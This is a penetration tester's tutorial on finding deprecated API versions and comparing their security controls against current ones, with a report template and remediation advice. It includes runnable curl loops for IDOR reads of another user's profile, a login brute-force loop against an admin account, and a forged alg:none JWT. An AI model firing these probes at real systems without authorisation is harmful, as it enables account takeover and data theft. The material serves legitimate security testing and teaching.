# API Versioning Security — Enterprise Penetration Testing Field Notes

> **Author:** Dheeraj Kumar Jayaswal — Senior Penetration Tester | 5+ Years Enterprise AppSec
>
> **Category:** API Security — OWASP API9:2023 Improper Inventory Management
>
> **Severity:** High to Critical — old API versions consistently have weaker security controls than current ones
>
> **Real-world impact:** API versioning is the security gap that organisations consistently underestimate. Teams harden `/api/v2/` because it is the current version and receives security reviews. `/api/v1/` — which was supposed to be deprecated six months ago — still responds, still has all 50 endpoints active, and never received the authentication improvements that went into v2. In enterprise engagements, I have found more Critical vulnerabilities on deprecated API versions than on current ones. This is not rare. It is the norm.

---

## 🧠 Why API Versioning Creates Security Debt

```
The API lifecycle that creates security gaps:

Year 1: Launch v1
  → Security review done
  → Rate limiting implemented
  → Authentication enforced

Year 2: Build v2 (new features, improved auth)
  → v2 security reviewed thoroughly
  → v1 officially "deprecated"
  → v1 still accessible (migration takes time)

Year 3: v1 is forgotten
  → Rate limiting never updated on v1
  → New auth requirements (MFA, stronger JWT) never applied to v1
  → New IDOR fixes applied to v2 endpoints but v1 path unchanged
  → Monitoring configured for v2 traffic only

Year 4: Pentest engagement
  → Tester finds v1 is still fully active
  → v1 missing rate limiting → brute force
  → v1 missing IDOR fix → data exposure
  → v1 missing new JWT validation → token bypass
  → v1 completely invisible to security monitoring
  → Critical findings on "deprecated" infrastructure

Enterprise reality:
  "Deprecated" in API roadmap documents ≠ "disabled" in production
```

---

## 🔍 Phase 1 — API Version Discovery

### Systematic Version Enumeration

```bash
TARGET="https://api.company.com"

# Common version patterns to test:
echo "=== Path-based versioning ==="
for v in v1 v2 v3 v4 v5 v6 v0 \
          1.0 1.1 2.0 2.1 3.0 \
          api/v1 api/v2 api/v3 \
          beta alpha preview next \
          dev test internal legacy old \
          stable current latest; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    "$TARGET/$v/users" \
    -H "Authorization: Bearer TOKEN" 2>/dev/null)
  [[ "$code" =~ ^(200|201|401|403)$ ]] && echo "$v: HTTP $code"
done

# Test specific high-value endpoint across all versions:
echo ""
echo "=== IDOR test across versions ==="
VICTIM_ID=1042
for v in v1 v2 v3; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    "$TARGET/api/$v/users/$VICTIM_ID" \
    -H "Authorization: Bearer STANDARD_USER_TOKEN" 2>/dev/null)
  echo "GET /api/$v/users/$VICTIM_ID → HTTP $code"
done
# If v1 returns 200 and v2 returns 403 = v1 missing IDOR protection
```

### Header-Based and Parameter-Based Versioning

```bash
# Some APIs use Accept header for versioning:
for v in "application/vnd.company.v1+json" \
         "application/vnd.company.v2+json" \
         "application/json;version=1" \
         "application/json;version=2"; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    "$TARGET/api/users" \
    -H "Accept: $v" \
    -H "Authorization: Bearer TOKEN" 2>/dev/null)
  echo "Accept: $v → HTTP $code"
done

# Query parameter versioning:
for v in 1 2 3; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    "$TARGET/api/users?version=$v" \
    -H "Authorization: Bearer TOKEN" 2>/dev/null)
  echo "?version=$v → HTTP $code"
done

# Custom header versioning:
for v in 1 2 3; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    "$TARGET/api/users" \
    -H "X-API-Version: $v" \
    -H "Authorization: Bearer TOKEN" 2>/dev/null)
  echo "X-API-Version: $v → HTTP $code"
done
```

### Automated Version Discovery With ffuf

```bash
# Fuzz for API version paths:
ffuf -u "https://api.company.com/FUZZ/users" \
  -w api_versions.txt \
  -H "Authorization: Bearer TOKEN" \
  -mc 200,201,401,403 \
  -o api_versions_found.json

# api_versions.txt content:
cat > api_versions.txt << 'EOF'
v1
v2
v3
v4
v5
api/v1
api/v2
api/v3
1.0
2.0
3.0
beta
alpha
preview
dev
internal
legacy
old
current
latest
stable
next
EOF

# Process results:
cat api_versions_found.json | \
  jq -r '.results[] | "\(.status) \(.url)"' | sort
```

---

## 💥 Phase 2 — Security Comparison Testing Across Versions

### Comparing Authentication Requirements

```bash
echo "=== Authentication enforcement per version ==="
for v in v1 v2; do
  # Test WITHOUT any authorization header
  code=$(curl -so /dev/null -w "%{http_code}" \
    "https://api.company.com/api/$v/users/me" 2>/dev/null)
  echo "GET /api/$v/users/me (no auth) → HTTP $code"
done

# Expected: Both v1 and v2 return 401 without token
# Finding if v1 returns 200 = unauthenticated access on deprecated version

# Test with invalid/expired token:
for v in v1 v2; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    "https://api.company.com/api/$v/users/me" \
    -H "Authorization: Bearer EXPIRED_TOKEN_HERE" 2>/dev/null)
  echo "GET /api/$v/users/me (expired token) → HTTP $code"
done
# v2 returns 401, v1 returns 200 = v1 missing token validation
```

### Comparing IDOR / Access Control

```bash
echo "=== IDOR comparison across versions ==="
# Account A (attacker): user_id = 1099
# Account B (victim):   user_id = 1042

for v in v1 v2; do
  echo "--- API $v ---"
  # Try to read victim's profile as attacker
  response=$(curl -s \
    "https://api.company.com/api/$v/users/1042" \
    -H "Authorization: Bearer ATTACKER_TOKEN")
  status=$(curl -so /dev/null -w "%{http_code}" \
    "https://api.company.com/api/$v/users/1042" \
    -H "Authorization: Bearer ATTACKER_TOKEN")
  echo "GET /api/$v/users/1042 → HTTP $status"
  # Show if victim's email appears in response (confirms BOLA)
  echo "$response" | jq '.email' 2>/dev/null
  echo ""
done

# Document findings:
# v2/users/1042 → 403 Forbidden (ownership enforced)
# v1/users/1042 → 200 OK + victim's full profile = Critical IDOR on v1
```

### Comparing Rate Limiting

```bash
echo "=== Rate limiting comparison ==="
for v in v1 v2; do
  echo "--- Testing /api/$v/auth/login ---"
  # Send 20 rapid login attempts
  for i in $(seq 1 20); do
    code=$(curl -so /dev/null -w "%{http_code}" \
      -X POST "https://api.company.com/api/$v/auth/login" \
      -H "Content-Type: application/json" \
      -d '{"email":"admin@company.com","password":"WrongPass'$i'"}' 2>/dev/null)
    echo -n "Attempt $i: $code  "
    [[ "$code" == "429" ]] && { echo "(RATE LIMITED at attempt $i)"; break; }
  done
  echo ""
done

# Expected: Both versions rate limit after N attempts
# Finding: v1 accepts all 20 attempts = missing rate limiting on old version
```

### Comparing JWT Validation

```bash
echo "=== JWT validation comparison ==="

# Generate an alg:none token (should be rejected by both)
NONE_TOKEN="eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VySWQiOjEsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0."

for v in v1 v2; do
  code=$(curl -so /dev/null -w "%{http_code}" \
    "https://api.company.com/api/$v/users/me" \
    -H "Authorization: Bearer $NONE_TOKEN" 2>/dev/null)
  echo "alg:none on /api/$v → HTTP $code"
done

# v2 returns 401 (alg:none rejected)
# v1 returns 200 (alg:none accepted) = Critical JWT vulnerability on old version
```

---

## 📊 Version Security Comparison Matrix

```
Build this table during every engagement where multiple API versions exist:

Security Control        | v1  | v2  | v3  | Finding?
────────────────────────────────────────────────────
Authentication required | ✗   | ✓   | ✓   | CRITICAL — v1 unauth
Rate limiting on login  | ✗   | ✓   | ✓   | HIGH — v1 brute forceable
IDOR check on /users/{id}| ✗  | ✓   | ✓   | CRITICAL — v1 IDOR
IDOR check on /orders/{id}| ✗ | ✓   | ✓   | CRITICAL — v1 IDOR
JWT alg:none rejected   | ✗   | ✓   | ✓   | CRITICAL — v1 JWT bypass
JWT expiry validated    | ✗   | ✓   | ✓   | HIGH — v1 token replay
Input validation        | ✗   | ✓   | ✓   | HIGH — v1 SQLi possible
Swagger exposed         | ✓   | ✗   | ✗   | MEDIUM — v1 spec exposed
```

---

## 🗂️ Systematic Testing Checklist

```
VERSION DISCOVERY
☐ Enumerate all path-based versions: v1-v6, beta, alpha, internal
☐ Test header-based versioning: Accept, X-API-Version
☐ Test query parameter versioning: ?version=1
☐ Check Swagger spec for documented versions
☐ Check JavaScript bundle for version references
☐ Check Wayback Machine for historical version paths

SECURITY COMPARISON (for each version found)
☐ Authentication: test without any Authorization header
☐ Authentication: test with expired/invalid token
☐ IDOR: test all {id} path parameters with victim's IDs
☐ Rate limiting: 20 rapid auth attempts
☐ JWT: alg:none attack
☐ JWT: weak secret brute force
☐ Mass assignment: inject privileged fields
☐ Input validation: SQLi probe on string parameters

MONITORING DETECTION CHECK
☐ Verify if old version traffic appears in SIEM/monitoring
☐ Check if WAF rules apply equally to all versions
☐ Document version accessibility in report as inventory gap
```

---

## 📋 Enterprise Pentest Report Template

**Finding Title:** Deprecated API Version v1 Active in Production — Missing Authentication, IDOR, and Rate Limiting Controls

**Severity:** Critical | **CVSS v3.1:** 9.8 (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Affected Endpoints:** All endpoints under `/api/v1/` (43 endpoints confirmed active)

```
Discovery:
  Version enumeration identified /api/v1/ is still fully active.
  Per client documentation, v1 was "deprecated" in Q3 2023.
  Testing confirmed 43 endpoints remain active and accessible.

Critical differences between v1 and v2:

1. UNAUTHENTICATED ACCESS — v1 only:
   curl https://api.company.com/api/v1/users/me (no token)
   → HTTP 200: Full user profile returned without authentication

2. IDOR ON USER PROFILES — v1 only:
   curl https://api.company.com/api/v1/users/1042 -H "Bearer ATTACKER_TOKEN"
   v2 → HTTP 403 (ownership enforced)
   v1 → HTTP 200 (victim's profile including salary, national_id returned)

3. MISSING RATE LIMITING — v1 only:
   20 consecutive failed login attempts on /api/v1/auth/login:
   v2: HTTP 429 at attempt 6 (rate limited)
   v1: HTTP 401 throughout all 20 (no rate limiting)

4. JWT ALGORITHM NONE ACCEPTED — v1 only:
   Forged token with alg:none accepted by v1 /auth/validate
   v2 correctly returns 401

Impact:
  Unauthenticated access to the full user database via v1 endpoints.
  All security improvements deployed in v2 are bypassable by targeting v1.
  The deprecated API version represents a complete security control bypass.

Remediation:
  Immediate: Disable all /api/v1/ endpoints via reverse proxy rule
  # nginx:
  location /api/v1/ {
    return 410 '{"error":"This API version is discontinued"}';
  }

  Short-term: Implement version sunset policy with automated disabling
  Long-term: API gateway version management with uniform security enforcement
  Long-term: Include deprecated API versions in security monitoring scope
```

---

## 🧭 Key Takeaways

**1. "Deprecated" never means "disabled" until you verify it manually.**
In every enterprise engagement where I find multiple API versions, the deprecated one has weaker controls. Development teams apply security improvements to the current version. They do not backport them to deprecated versions. Always test every active version.

**2. Compare security controls version-by-version, not just endpoint-by-endpoint.**
The power of version security testing is systematic comparison. Build a matrix: authentication enforcement, rate limiting, IDOR protection, JWT validation — one column per version. A single row showing "v1: ✗, v2: ✓" is a high-severity finding. Multiple rows like that is Critical.

**3. Old versions are invisible to security monitoring.**
When the SIEM team configured alerts for suspicious API behaviour, they configured them for the current version's endpoints. Traffic to deprecated endpoints often generates no alerts — making the old version not just vulnerable but also undetected. This belongs in the report as a separate monitoring gap finding.

**4. The mobile app is often the last to stop using the old version.**
The web frontend migrated to v2 last year. The Android app still uses v1 because the mobile team has a two-quarter backlog. Finding the mobile API version via APK analysis or mobile traffic proxying consistently reveals a version that the web team has "retired."

---

## 🔗 References
- [OWASP API9:2023 — Improper Inventory Management](https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/)
- [PortSwigger API Testing — Identifying Supported Versions](https://portswigger.net/web-security/api-testing)
- [OWASP API Security Project](https://owasp.org/www-project-api-security/)

---
<div align="center">

*Part of [AppSec From The Trenches](../README.md) — Real notes from 6+ years of enterprise penetration testing.*

[![LinkedIn](https://img.shields.io/badge/LinkedIn-Dheeraj%20Kumar%20Jayaswal-0077B5?style=flat-square&logo=linkedin&logoColor=white)](https://linkedin.com/in/dheerajkumarjayaswal)

</div>
